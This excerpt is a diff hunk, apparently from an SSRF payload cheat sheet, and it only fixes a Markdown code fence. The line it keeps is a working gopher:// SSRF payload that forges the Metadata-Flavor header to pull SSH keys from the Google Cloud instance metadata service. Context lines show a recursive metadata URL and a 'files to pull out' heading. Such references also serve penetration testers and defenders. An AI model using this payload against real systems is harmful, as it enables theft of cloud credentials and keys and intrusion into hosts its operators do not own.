@@ -504,7 +504,8 @@ http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
 Required headers can be set using a gopher SSRF with the following technique
 
 ```powershell
-gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a``
+gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
+```
 
 Interesting files to pull out:
 
